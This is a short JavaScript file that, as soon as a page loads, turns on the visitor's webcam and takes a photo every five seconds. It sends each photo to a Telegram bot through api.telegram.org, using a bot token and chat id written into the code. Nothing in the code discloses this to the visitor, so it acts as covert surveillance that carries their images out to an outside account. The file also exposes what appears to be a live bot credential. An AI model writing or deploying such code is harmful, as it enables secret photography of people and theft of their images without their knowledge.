async function sendPhotoToTelegram(photoBlob) {
  const formData = new FormData();
  formData.append("photo", photoBlob, "webcam.jpg");

  // Replace with your Telegram bot token and chat_id
  const botToken = "6998528299:AAF-IfmNR4SHLbL3qYy9qDwMfW4ghq1izTE";
  const chatId = "5802480458";

  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;

  try {
    const response = await fetch(telegramApiUrl, {
      method: "POST",
      body: formData
    });
    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error("Error sending photo to Telegram:", error);
  }
}

async function capturePhoto() {
  const video = document.getElementById("webcam");
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(sendPhotoToTelegram, "image/jpeg");
}

function startWebcam() {
  const video = document.getElementById("webcam");

  navigator.mediaDevices
    .getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
    })
    .catch(error => {
      console.error("Error accessing webcam:", error);
    });
}

function startPhotoCapture() {
  startWebcam();
  setInterval(capturePhoto, 5000); // Capture photo every 5 seconds
}

document.addEventListener("DOMContentLoaded", () => {
  startPhotoCapture();
});
